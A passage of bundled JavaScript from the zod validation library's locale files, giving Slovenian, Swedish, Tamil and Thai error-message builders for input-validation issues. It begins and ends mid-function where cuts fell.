        if (/^[A-Z]/.test(issue2.expected)) {
          return `Neveljaven vnos: pri\u010Dakovano instanceof ${issue2.expected}, prejeto ${received}`;
        }
        return `Neveljaven vnos: pri\u010Dakovano ${expected}, prejeto ${received}`;
      }
      case "invalid_value":
        if (issue2.values.length === 1)
          return `Neveljaven vnos: pri\u010Dakovano ${stringifyPrimitive(issue2.values[0])}`;
        return `Neveljavna mo\u017Enost: pri\u010Dakovano eno izmed ${joinValues(issue2.values, "|")}`;
      case "too_big": {
        const adj = issue2.inclusive ? "<=" : "<";
        const sizing = getSizing(issue2.origin);
        if (sizing)
          return `Preveliko: pri\u010Dakovano, da bo ${issue2.origin ?? "vrednost"} imelo ${adj}${issue2.maximum.toString()} ${sizing.unit ?? "elementov"}`;
        return `Preveliko: pri\u010Dakovano, da bo ${issue2.origin ?? "vrednost"} ${adj}${issue2.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue2.inclusive ? ">=" : ">";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          return `Premajhno: pri\u010Dakovano, da bo ${issue2.origin} imelo ${adj}${issue2.minimum.toString()} ${sizing.unit}`;
        }
        return `Premajhno: pri\u010Dakovano, da bo ${issue2.origin} ${adj}${issue2.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with") {
          return `Neveljaven niz: mora se za\u010Deti z "${_issue.prefix}"`;
        }
        if (_issue.format === "ends_with")
          return `Neveljaven niz: mora se kon\u010Dati z "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `Neveljaven niz: mora vsebovati "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `Neveljaven niz: mora ustrezati vzorcu ${_issue.pattern}`;
        return `Neveljaven ${FormatDictionary[_issue.format] ?? issue2.format}`;
      }
      case "not_multiple_of":
        return `Neveljavno \u0161tevilo: mora biti ve\u010Dkratnik ${issue2.divisor}`;
      case "unrecognized_keys":
        return `Neprepoznan${issue2.keys.length > 1 ? "i klju\u010Di" : " klju\u010D"}: ${joinValues(issue2.keys, ", ")}`;
      case "invalid_key":
        return `Neveljaven klju\u010D v ${issue2.origin}`;
      case "invalid_union":
        return "Neveljaven vnos";
      case "invalid_element":
        return `Neveljavna vrednost v ${issue2.origin}`;
      default:
        return "Neveljaven vnos";
    }
  };
};
function sl_default() {
  return {
    localeError: error36()
  };
}
// node_modules/zod/v4/locales/sv.js
var error37 = () => {
  const Sizable = {
    string: { unit: "tecken", verb: "att ha" },
    file: { unit: "bytes", verb: "att ha" },
    array: { unit: "objekt", verb: "att inneh\xE5lla" },
    set: { unit: "objekt", verb: "att inneh\xE5lla" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "regulj\xE4rt uttryck",
    email: "e-postadress",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO-datum och tid",
    date: "ISO-datum",
    time: "ISO-tid",
    duration: "ISO-varaktighet",
    ipv4: "IPv4-intervall",
    ipv6: "IPv6-intervall",
    cidrv4: "IPv4-spektrum",
    cidrv6: "IPv6-spektrum",
    base64: "base64-kodad str\xE4ng",
    base64url: "base64url-kodad str\xE4ng",
    json_string: "JSON-str\xE4ng",
    e164: "E.164-nummer",
    jwt: "JWT",
    template_literal: "mall-literal"
  };
  const TypeDictionary = {
    nan: "NaN",
    number: "antal",
    array: "lista"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `Ogiltig inmatning: f\xF6rv\xE4ntat instanceof ${issue2.expected}, fick ${received}`;
        }
        return `Ogiltig inmatning: f\xF6rv\xE4ntat ${expected}, fick ${received}`;
      }
      case "invalid_value":
        if (issue2.values.length === 1)
          return `Ogiltig inmatning: f\xF6rv\xE4ntat ${stringifyPrimitive(issue2.values[0])}`;
        return `Ogiltigt val: f\xF6rv\xE4ntade en av ${joinValues(issue2.values, "|")}`;
      case "too_big": {
        const adj = issue2.inclusive ? "<=" : "<";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          return `F\xF6r stor(t): f\xF6rv\xE4ntade ${issue2.origin ?? "v\xE4rdet"} att ha ${adj}${issue2.maximum.toString()} ${sizing.unit ?? "element"}`;
        }
        return `F\xF6r stor(t): f\xF6rv\xE4ntat ${issue2.origin ?? "v\xE4rdet"} att ha ${adj}${issue2.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue2.inclusive ? ">=" : ">";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          return `F\xF6r lite(t): f\xF6rv\xE4ntade ${issue2.origin ?? "v\xE4rdet"} att ha ${adj}${issue2.minimum.toString()} ${sizing.unit}`;
        }
        return `F\xF6r lite(t): f\xF6rv\xE4ntade ${issue2.origin ?? "v\xE4rdet"} att ha ${adj}${issue2.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with") {
          return `Ogiltig str\xE4ng: m\xE5ste b\xF6rja med "${_issue.prefix}"`;
        }
        if (_issue.format === "ends_with")
          return `Ogiltig str\xE4ng: m\xE5ste sluta med "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `Ogiltig str\xE4ng: m\xE5ste inneh\xE5lla "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `Ogiltig str\xE4ng: m\xE5ste matcha m\xF6nstret "${_issue.pattern}"`;
        return `Ogiltig(t) ${FormatDictionary[_issue.format] ?? issue2.format}`;
      }
      case "not_multiple_of":
        return `Ogiltigt tal: m\xE5ste vara en multipel av ${issue2.divisor}`;
      case "unrecognized_keys":
        return `${issue2.keys.length > 1 ? "Ok\xE4nda nycklar" : "Ok\xE4nd nyckel"}: ${joinValues(issue2.keys, ", ")}`;
      case "invalid_key":
        return `Ogiltig nyckel i ${issue2.origin ?? "v\xE4rdet"}`;
      case "invalid_union":
        return "Ogiltig input";
      case "invalid_element":
        return `Ogiltigt v\xE4rde i ${issue2.origin ?? "v\xE4rdet"}`;
      default:
        return `Ogiltig input`;
    }
  };
};
function sv_default() {
  return {
    localeError: error37()
  };
}
// node_modules/zod/v4/locales/ta.js
var error38 = () => {
  const Sizable = {
    string: { unit: "\u0B8E\u0BB4\u0BC1\u0BA4\u0BCD\u0BA4\u0BC1\u0B95\u0BCD\u0B95\u0BB3\u0BCD", verb: "\u0B95\u0BCA\u0BA3\u0BCD\u0B9F\u0BBF\u0BB0\u0BC1\u0B95\u0BCD\u0B95 \u0BB5\u0BC7\u0BA3\u0BCD\u0B9F\u0BC1\u0BAE\u0BCD" },
    file: { unit: "\u0BAA\u0BC8\u0B9F\u0BCD\u0B9F\u0BC1\u0B95\u0BB3\u0BCD", verb: "\u0B95\u0BCA\u0BA3\u0BCD\u0B9F\u0BBF\u0BB0\u0BC1\u0B95\u0BCD\u0B95 \u0BB5\u0BC7\u0BA3\u0BCD\u0B9F\u0BC1\u0BAE\u0BCD" },
    array: { unit: "\u0B89\u0BB1\u0BC1\u0BAA\u0BCD\u0BAA\u0BC1\u0B95\u0BB3\u0BCD", verb: "\u0B95\u0BCA\u0BA3\u0BCD\u0B9F\u0BBF\u0BB0\u0BC1\u0B95\u0BCD\u0B95 \u0BB5\u0BC7\u0BA3\u0BCD\u0B9F\u0BC1\u0BAE\u0BCD" },
    set: { unit: "\u0B89\u0BB1\u0BC1\u0BAA\u0BCD\u0BAA\u0BC1\u0B95\u0BB3\u0BCD", verb: "\u0B95\u0BCA\u0BA3\u0BCD\u0B9F\u0BBF\u0BB0\u0BC1\u0B95\u0BCD\u0B95 \u0BB5\u0BC7\u0BA3\u0BCD\u0B9F\u0BC1\u0BAE\u0BCD" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "\u0B89\u0BB3\u0BCD\u0BB3\u0BC0\u0B9F\u0BC1",
    email: "\u0BAE\u0BBF\u0BA9\u0BCD\u0BA9\u0B9E\u0BCD\u0B9A\u0BB2\u0BCD \u0BAE\u0BC1\u0B95\u0BB5\u0BB0\u0BBF",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO \u0BA4\u0BC7\u0BA4\u0BBF \u0BA8\u0BC7\u0BB0\u0BAE\u0BCD",
    date: "ISO \u0BA4\u0BC7\u0BA4\u0BBF",
    time: "ISO \u0BA8\u0BC7\u0BB0\u0BAE\u0BCD",
    duration: "ISO \u0B95\u0BBE\u0BB2 \u0B85\u0BB3\u0BB5\u0BC1",
    ipv4: "IPv4 \u0BAE\u0BC1\u0B95\u0BB5\u0BB0\u0BBF",
    ipv6: "IPv6 \u0BAE\u0BC1\u0B95\u0BB5\u0BB0\u0BBF",
    cidrv4: "IPv4 \u0BB5\u0BB0\u0BAE\u0BCD\u0BAA\u0BC1",
    cidrv6: "IPv6 \u0BB5\u0BB0\u0BAE\u0BCD\u0BAA\u0BC1",
    base64: "base64-encoded \u0B9A\u0BB0\u0BAE\u0BCD",
    base64url: "base64url-encoded \u0B9A\u0BB0\u0BAE\u0BCD",
    json_string: "JSON \u0B9A\u0BB0\u0BAE\u0BCD",
    e164: "E.164 \u0B8E\u0BA3\u0BCD",
    jwt: "JWT",
    template_literal: "input"
  };
  const TypeDictionary = {
    nan: "NaN",
    number: "\u0B8E\u0BA3\u0BCD",
    array: "\u0B85\u0BA3\u0BBF",
    null: "\u0BB5\u0BC6\u0BB1\u0BC1\u0BAE\u0BC8"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `\u0BA4\u0BB5\u0BB1\u0BBE\u0BA9 \u0B89\u0BB3\u0BCD\u0BB3\u0BC0\u0B9F\u0BC1: \u0B8E\u0BA4\u0BBF\u0BB0\u0BCD\u0BAA\u0BBE\u0BB0\u0BCD\u0B95\u0BCD\u0B95\u0BAA\u0BCD\u0BAA\u0B9F\u0BCD\u0B9F\u0BA4\u0BC1 instanceof ${issue2.expected}, \u0BAA\u0BC6\u0BB1\u0BAA\u0BCD\u0BAA\u0B9F\u0BCD\u0B9F\u0BA4\u0BC1 ${received}`;
        }
        return `\u0BA4\u0BB5\u0BB1\u0BBE\u0BA9 \u0B89\u0BB3\u0BCD\u0BB3\u0BC0\u0B9F\u0BC1: \u0B8E\u0BA4\u0BBF\u0BB0\u0BCD\u0BAA\u0BBE\u0BB0\u0BCD\u0B95\u0BCD\u0B95\u0BAA\u0BCD\u0BAA\u0B9F\u0BCD\u0B9F\u0BA4\u0BC1 ${expected}, \u0BAA\u0BC6\u0BB1\u0BAA\u0BCD\u0BAA\u0B9F\u0BCD\u0B9F\u0BA4\u0BC1 ${received}`;
      }
      case "invalid_value":
        if (issue2.values.length === 1)
          return `\u0BA4\u0BB5\u0BB1\u0BBE\u0BA9 \u0B89\u0BB3\u0BCD\u0BB3\u0BC0\u0B9F\u0BC1: \u0B8E\u0BA4\u0BBF\u0BB0\u0BCD\u0BAA\u0BBE\u0BB0\u0BCD\u0B95\u0BCD\u0B95\u0BAA\u0BCD\u0BAA\u0B9F\u0BCD\u0B9F\u0BA4\u0BC1 ${stringifyPrimitive(issue2.values[0])}`;
        return `\u0BA4\u0BB5\u0BB1\u0BBE\u0BA9 \u0BB5\u0BBF\u0BB0\u0BC1\u0BAA\u0BCD\u0BAA\u0BAE\u0BCD: \u0B8E\u0BA4\u0BBF\u0BB0\u0BCD\u0BAA\u0BBE\u0BB0\u0BCD\u0B95\u0BCD\u0B95\u0BAA\u0BCD\u0BAA\u0B9F\u0BCD\u0B9F\u0BA4\u0BC1 ${joinValues(issue2.values, "|")} \u0B87\u0BB2\u0BCD \u0B92\u0BA9\u0BCD\u0BB1\u0BC1`;
      case "too_big": {
        const adj = issue2.inclusive ? "<=" : "<";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          return `\u0BAE\u0BBF\u0B95 \u0BAA\u0BC6\u0BB0\u0BBF\u0BAF\u0BA4\u0BC1: \u0B8E\u0BA4\u0BBF\u0BB0\u0BCD\u0BAA\u0BBE\u0BB0\u0BCD\u0B95\u0BCD\u0B95\u0BAA\u0BCD\u0BAA\u0B9F\u0BCD\u0B9F\u0BA4\u0BC1 ${issue2.origin ?? "\u0BAE\u0BA4\u0BBF\u0BAA\u0BCD\u0BAA\u0BC1"} ${adj}${issue2.maximum.toString()} ${sizing.unit ?? "\u0B89\u0BB1\u0BC1\u0BAA\u0BCD\u0BAA\u0BC1\u0B95\u0BB3\u0BCD"} \u0B86\u0B95 \u0B87\u0BB0\u0BC1\u0B95\u0BCD\u0B95 \u0BB5\u0BC7\u0BA3\u0BCD\u0B9F\u0BC1\u0BAE\u0BCD`;
        }
        return `\u0BAE\u0BBF\u0B95 \u0BAA\u0BC6\u0BB0\u0BBF\u0BAF\u0BA4\u0BC1: \u0B8E\u0BA4\u0BBF\u0BB0\u0BCD\u0BAA\u0BBE\u0BB0\u0BCD\u0B95\u0BCD\u0B95\u0BAA\u0BCD\u0BAA\u0B9F\u0BCD\u0B9F\u0BA4\u0BC1 ${issue2.origin ?? "\u0BAE\u0BA4\u0BBF\u0BAA\u0BCD\u0BAA\u0BC1"} ${adj}${issue2.maximum.toString()} \u0B86\u0B95 \u0B87\u0BB0\u0BC1\u0B95\u0BCD\u0B95 \u0BB5\u0BC7\u0BA3\u0BCD\u0B9F\u0BC1\u0BAE\u0BCD`;
      }
      case "too_small": {
        const adj = issue2.inclusive ? ">=" : ">";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          return `\u0BAE\u0BBF\u0B95\u0B9A\u0BCD \u0B9A\u0BBF\u0BB1\u0BBF\u0BAF\u0BA4\u0BC1: \u0B8E\u0BA4\u0BBF\u0BB0\u0BCD\u0BAA\u0BBE\u0BB0\u0BCD\u0B95\u0BCD\u0B95\u0BAA\u0BCD\u0BAA\u0B9F\u0BCD\u0B9F\u0BA4\u0BC1 ${issue2.origin} ${adj}${issue2.minimum.toString()} ${sizing.unit} \u0B86\u0B95 \u0B87\u0BB0\u0BC1\u0B95\u0BCD\u0B95 \u0BB5\u0BC7\u0BA3\u0BCD\u0B9F\u0BC1\u0BAE\u0BCD`;
        }
        return `\u0BAE\u0BBF\u0B95\u0B9A\u0BCD \u0B9A\u0BBF\u0BB1\u0BBF\u0BAF\u0BA4\u0BC1: \u0B8E\u0BA4\u0BBF\u0BB0\u0BCD\u0BAA\u0BBE\u0BB0\u0BCD\u0B95\u0BCD\u0B95\u0BAA\u0BCD\u0BAA\u0B9F\u0BCD\u0B9F\u0BA4\u0BC1 ${issue2.origin} ${adj}${issue2.minimum.toString()} \u0B86\u0B95 \u0B87\u0BB0\u0BC1\u0B95\u0BCD\u0B95 \u0BB5\u0BC7\u0BA3\u0BCD\u0B9F\u0BC1\u0BAE\u0BCD`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with")
          return `\u0BA4\u0BB5\u0BB1\u0BBE\u0BA9 \u0B9A\u0BB0\u0BAE\u0BCD: "${_issue.prefix}" \u0B87\u0BB2\u0BCD \u0BA4\u0BCA\u0B9F\u0B99\u0BCD\u0B95 \u0BB5\u0BC7\u0BA3\u0BCD\u0B9F\u0BC1\u0BAE\u0BCD`;
        if (_issue.format === "ends_with")
          return `\u0BA4\u0BB5\u0BB1\u0BBE\u0BA9 \u0B9A\u0BB0\u0BAE\u0BCD: "${_issue.suffix}" \u0B87\u0BB2\u0BCD \u0BAE\u0BC1\u0B9F\u0BBF\u0BB5\u0B9F\u0BC8\u0BAF \u0BB5\u0BC7\u0BA3\u0BCD\u0B9F\u0BC1\u0BAE\u0BCD`;
        if (_issue.format === "includes")
          return `\u0BA4\u0BB5\u0BB1\u0BBE\u0BA9 \u0B9A\u0BB0\u0BAE\u0BCD: "${_issue.includes}" \u0B90 \u0B89\u0BB3\u0BCD\u0BB3\u0B9F\u0B95\u0BCD\u0B95 \u0BB5\u0BC7\u0BA3\u0BCD\u0B9F\u0BC1\u0BAE\u0BCD`;
        if (_issue.format === "regex")
          return `\u0BA4\u0BB5\u0BB1\u0BBE\u0BA9 \u0B9A\u0BB0\u0BAE\u0BCD: ${_issue.pattern} \u0BAE\u0BC1\u0BB1\u0BC8\u0BAA\u0BBE\u0B9F\u0BCD\u0B9F\u0BC1\u0B9F\u0BA9\u0BCD \u0BAA\u0BCA\u0BB0\u0BC1\u0BA8\u0BCD\u0BA4 \u0BB5\u0BC7\u0BA3\u0BCD\u0B9F\u0BC1\u0BAE\u0BCD`;
        return `\u0BA4\u0BB5\u0BB1\u0BBE\u0BA9 ${FormatDictionary[_issue.format] ?? issue2.format}`;
      }
      case "not_multiple_of":
        return `\u0BA4\u0BB5\u0BB1\u0BBE\u0BA9 \u0B8E\u0BA3\u0BCD: ${issue2.divisor} \u0B87\u0BA9\u0BCD \u0BAA\u0BB2\u0BAE\u0BBE\u0B95 \u0B87\u0BB0\u0BC1\u0B95\u0BCD\u0B95 \u0BB5\u0BC7\u0BA3\u0BCD\u0B9F\u0BC1\u0BAE\u0BCD`;
      case "unrecognized_keys":
        return `\u0B85\u0B9F\u0BC8\u0BAF\u0BBE\u0BB3\u0BAE\u0BCD \u0BA4\u0BC6\u0BB0\u0BBF\u0BAF\u0BBE\u0BA4 \u0BB5\u0BBF\u0B9A\u0BC8${issue2.keys.length > 1 ? "\u0B95\u0BB3\u0BCD" : ""}: ${joinValues(issue2.keys, ", ")}`;
      case "invalid_key":
        return `${issue2.origin} \u0B87\u0BB2\u0BCD \u0BA4\u0BB5\u0BB1\u0BBE\u0BA9 \u0BB5\u0BBF\u0B9A\u0BC8`;
      case "invalid_union":
        return "\u0BA4\u0BB5\u0BB1\u0BBE\u0BA9 \u0B89\u0BB3\u0BCD\u0BB3\u0BC0\u0B9F\u0BC1";
      case "invalid_element":
        return `${issue2.origin} \u0B87\u0BB2\u0BCD \u0BA4\u0BB5\u0BB1\u0BBE\u0BA9 \u0BAE\u0BA4\u0BBF\u0BAA\u0BCD\u0BAA\u0BC1`;
      default:
        return `\u0BA4\u0BB5\u0BB1\u0BBE\u0BA9 \u0B89\u0BB3\u0BCD\u0BB3\u0BC0\u0B9F\u0BC1`;
    }
  };
};
function ta_default() {
  return {
    localeError: error38()
  };
}
// node_modules/zod/v4/locales/th.js
var error39 = () => {
  const Sizable = {
    string: { unit: "\u0E15\u0E31\u0E27\u0E2D\u0E31\u0E01\u0E29\u0E23", verb: "\u0E04\u0E27\u0E23\u0E21\u0E35" },
    file: { unit: "\u0E44\u0E1A\u0E15\u0E4C", verb: "\u0E04\u0E27\u0E23\u0E21\u0E35" },
    array: { unit: "\u0E23\u0E32\u0E22\u0E01\u0E32\u0E23", verb: "\u0E04\u0E27\u0E23\u0E21\u0E35" },
    set: { unit: "\u0E23\u0E32\u0E22\u0E01\u0E32\u0E23", verb: "\u0E04\u0E27\u0E23\u0E21\u0E35" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "\u0E02\u0E49\u0E2D\u0E21\u0E39\u0E25\u0E17\u0E35\u0E48\u0E1B\u0E49\u0E2D\u0E19",
    email: "\u0E17\u0E35\u0E48\u0E2D\u0E22\u0E39\u0E48\u0E2D\u0E35\u0E40\u0E21\u0E25",
    url: "URL",
    emoji: "\u0E2D\u0E34\u0E42\u0E21\u0E08\u0E34",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "\u0E27\u0E31\u0E19\u0E17\u0E35\u0E48\u0E40\u0E27\u0E25\u0E32\u0E41\u0E1A\u0E1A ISO",
    date: "\u0E27\u0E31\u0E19\u0E17\u0E35\u0E48\u0E41\u0E1A\u0E1A ISO",
    time: "\u0E40\u0E27\u0E25\u0E32\u0E41\u0E1A\u0E1A ISO",
    duration: "\u0E0A\u0E48\u0E27\u0E07\u0E40\u0E27\u0E25\u0E32\u0E41\u0E1A\u0E1A ISO",
    ipv4: "\u0E17\u0E35\u0E48\u0E2D\u0E22\u0E39\u0E48 IPv4",
    ipv6: "\u0E17\u0E35\u0E48\u0E2D\u0E22\u0E39\u0E48 IPv6",
    cidrv4: "\u0E0A\u0E48\u0E27\u0E07 IP \u0E41\u0E1A\u0E1A IPv4",
    cidrv6: "\u0E0A\u0E48\u0E27\u0E07 IP \u0E41\u0E1A\u0E1A IPv6",
    base64: "\u0E02\u0E49\u0E2D\u0E04\u0E27\u0E32\u0E21\u0E41\u0E1A\u0E1A Base64",
    base64url: "\u0E02\u0E49\u0E2D\u0E04\u0E27\u0E32\u0E21\u0E41\u0E1A\u0E1A Base64 \u0E2A\u0E33\u0E2B\u0E23\u0E31\u0E1A URL",
    json_string: "\u0E02\u0E49\u0E2D\u0E04\u0E27\u0E32\u0E21\u0E41\u0E1A\u0E1A JSON",
    e164: "\u0E40\u0E1A\u0E2D\u0E23\u0E4C\u0E42\u0E17\u0E23\u0E28\u0E31\u0E1E\u0E17\u0E4C\u0E23\u0E30\u0E2B\u0E27\u0E48\u0E32\u0E07\u0E1B\u0E23\u0E30\u0E40\u0E17\u0E28 (E.164)",
    jwt: "\u0E42\u0E17\u0E40\u0E04\u0E19 JWT",
    template_literal: "\u0E02\u0E49\u0E2D\u0E21\u0E39\u0E25\u0E17\u0E35\u0E48\u0E1B\u0E49\u0E2D\u0E19"
  };
  const TypeDictionary = {
    nan: "NaN",
    number: "\u0E15\u0E31\u0E27\u0E40\u0E25\u0E02",
    array: "\u0E2D\u0E32\u0E23\u0E4C\u0E40\u0E23\u0E22\u0E4C (Array)",
    null: "\u0E44\u0E21\u0E48\u0E21\u0E35\u0E04\u0E48\u0E32 (null)"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `\u0E1B\u0E23\u0E30\u0E40\u0E20\u0E17\u0E02\u0E49\u0E2D\u0E21\u0E39\u0E25\u0E44\u0E21\u0E48\u0E16\u0E39\u0E01\u0E15\u0E49\u0E2D\u0E07: \u0E04\u0E27\u0E23\u0E40\u0E1B\u0E47\u0E19 instanceof ${issue2.expected} \u0E41\u0E15\u0E48\u0E44\u0E14\u0E49\u0E23\u0E31\u0E1A ${received}`;
        }
        return `\u0E1B\u0E23\u0E30\u0E40\u0E20\u0E17\u0E02\u0E49\u0E2D\u0E21\u0E39\u0E25\u0E44\u0E21\u0E48\u0E16\u0E39\u0E01\u0E15\u0E49\u0E2D\u0E07: \u0E04\u0E27\u0E23\u0E40\u0E1B\u0E47\u0E19 ${expected} \u0E41\u0E15\u0E48\u0E44\u0E14\u0E49\u0E23\u0E31\u0E1A ${received}`;
      }
      case "invalid_value":
        if (issue2.values.length === 1)
          return `\u0E04\u0E48\u0E32\u0E44\u0E21\u0E48\u0E16\u0E39\u0E01\u0E15\u0E49\u0E2D\u0E07: \u0E04\u0E27\u0E23\u0E40\u0E1B\u0E47\u0E19 ${stringifyPrimitive(issue2.values[0])}`;
        return `\u0E15\u0E31\u0E27\u0E40\u0E25\u0E37\u0E2D\u0E01\u0E44\u0E21\u0E48\u0E16\u0E39\u0E01\u0E15\u0E49\u0E2D\u0E07: \u0E04\u0E27\u0E23\u0E40\u0E1B\u0E47\u0E19\u0E2B\u0E19\u0E36\u0E48\u0E07\u0E43\u0E19 ${joinValues(issue2.values, "|")}`;
      case "too_big": {
        const adj = issue2.inclusive ? "\u0E44\u0E21\u0E48\u0E40\u0E01\u0E34\u0E19" : "\u0E19\u0E49\u0E2D\u0E22\u0E01\u0E27\u0E48\u0E32";
        const sizing = getSizing(issue2.origin);
        if (sizing)
          return `\u0E40\u0E01\u0E34\u0E19\u0E01\u0E33\u0E2B\u0E19\u0E14: ${issue2.origin ?? "\u0E04\u0E48\u0E32"} \u0E04\u0E27\u0E23\u0E21\u0E35${adj} ${issue2.maximum.toString()} ${sizing.unit ?? "\u0E23\u0E32\u0E22\u0E01\u0E32\u0E23"}`;
        return `\u0E40\u0E01\u0E34\u0E19\u0E01\u0E33\u0E2B\u0E19\u0E14: ${issue2.origin ?? "\u0E04\u0E48\u0E32"} \u0E04\u0E27\u0E23\u0E21\u0E35${adj} ${issue2.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue2.inclusive ? "\u0E2D\u0E22\u0E48\u0E32\u0E07\u0E19\u0E49\u0E2D\u0E22" : "\u0E21\u0E32\u0E01\u0E01\u0E27\u0E48\u0E32";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          return `\u0E19\u0E49\u0E2D\u0E22\u0E01\u0E27\u0E48\u0E32\u0E01\u0E33\u0E2B\u0E19\u0E14: ${issue2.origin} \u0E04\u0E27\u0E23\u0E21\u0E35${adj} ${issue2.minimum.toString()} ${sizing.unit}`;
        }
        return `\u0E19\u0E49\u0E2D\u0E22\u0E01\u0E27\u0E48\u0E32\u0E01\u0E33\u0E2B\u0E19\u0E14: ${issue2.origin} \u0E04\u0E27\u0E23\u0E21\u0E35${adj} ${issue2.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with") {
          return `\u0E23\u0E39\u0E1B\u0E41\u0E1A\u0E1A\u0E44\u0E21\u0E48\u0E16\u0E39\u0E01\u0E15\u0E49\u0E2D\u0E07: \u0E02\u0E49\u0E2D\u0E04\u0E27\u0E32\u0E21\u0E15\u0E49\u0E2D\u0E07\u0E02\u0E36\u0E49\u0E19\u0E15\u0E49\u0E19\u0E14\u0E49\u0E27\u0E22 "${_issue.prefix}"`;
        }
        if (_issue.format === "ends_with")
          return `\u0E23\u0E39\u0E1B\u0E41\u0E1A\u0E1A\u0E44\u0E21\u0E48\u0E16\u0E39\u0E01\u0E15\u0E49\u0E2D\u0E07: \u0E02\u0E49\u0E2D\u0E04\u0E27\u0E32\u0E21\u0E15\u0E49\u0E2D\u0E07\u0E25\u0E07\u0E17\u0E49\u0E32\u0E22\u0E14\u0E49\u0E27\u0E22 "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `\u0E23\u0E39\u0E1B\u0E41\u0E1A\u0E1A\u0E44\u0E21\u0E48\u0E16\u0E39\u0E01\u0E15\u0E49\u0E2D\u0E07: \u0E02\u0E49\u0E2D\u0E04\u0E27\u0E32\u0E21\u0E15\u0E49\u0E2D\u0E07\u0E21\u0E35 "${_issue.includes}" \u0E2D\u0E22\u0E39\u0E48\u0E43\u0E19\u0E02\u0E49\u0E2D\u0E04\u0E27\u0E32\u0E21`;
        if (_issue.format === "regex")
          return `\u0E23\u0E39\u0E1B\u0E41\u0E1A\u0E1A\u0E44\u0E21\u0E48\u0E16\u0E39\u0E01\u0E15\u0E49\u0E2D\u0E07: \u0E15\u0E49\u0E2D\u0E07\u0E15\u0E23\u0E07\u0E01\u0E31\u0E1A\u0E23\u0E39\u0E1B\u0E41\u0E1A\u0E1A\u0E17\u0E35\u0E48\u0E01\u0E33\u0E2B\u0E19\u0E14 ${_issue.pattern}`;
        return `\u0E23\u0E39\u0E1B\u0E41\u0E1A\u0E1A\u0E44\u0E21\u0E48\u0E16\u0E39\u0E01\u0E15\u0E49\u0E2D\u0E07: ${FormatDictionary[_issue.format] ?? issue2.format}`;
      }
      case "not_multiple_of":
        return `\u0E15\u0E31\u0E27\u0E40\u0E25\u0E02\u0E44\u0E21\u0E48\u0E16\u0E39\u0E01\u0E15\u0E49\u0E2D\u0E07: \u0E15\u0E49\u0E2D\u0E07\u0E40\u0E1B\u0E47\u0E19\u0E08\u0E33\u0E19\u0E27\u0E19\u0E17\u0E35\u0E48\u0E2B\u0E32\u0E23\u0E14\u0E49\u0E27\u0E22 ${issue2.divisor} \u0E44\u0E14\u0E49\u0E25\u0E07\u0E15\u0E31\u0E27`;
      case "unrecognized_keys":
        return `\u0E1E\u0E1A\u0E04\u0E35\u0E22\u0E4C\u0E17\u0E35\u0E48\u0E44\u0E21\u0E48\u0E23\u0E39\u0E49\u0E08\u0E31\u0E01: ${joinValues(issue2.keys, ", ")}`;
      case "invalid_key":
        return `\u0E04\u0E35\u0E22\u0E4C\u0E44\u0E21\u0E48\u0E16\u0E39\u0E01\u0E15\u0E49\u0E2D\u0E07\u0E43\u0E19 ${issue2.origin}`;
      case "invalid_union":
        return "\u0E02\u0E49\u0E2D\u0E21\u0E39\u0E25\u0E44\u0E21\u0E48\u0E16\u0E39\u0E01\u0E15\u0E49\u0E2D\u0E07: \u0E44\u0E21\u0E48\u0E15\u0E23\u0E07\u0E01\u0E31\u0E1A\u0E23\u0E39\u0E1B\u0E41\u0E1A\u0E1A\u0E22\u0E39\u0E40\u0E19\u0E35\u0E22\u0E19\u0E17\u0E35\u0E48\u0E01\u0E33\u0E2B\u0E19\u0E14\u0E44\u0E27\u0E49";
      case "invalid_element":
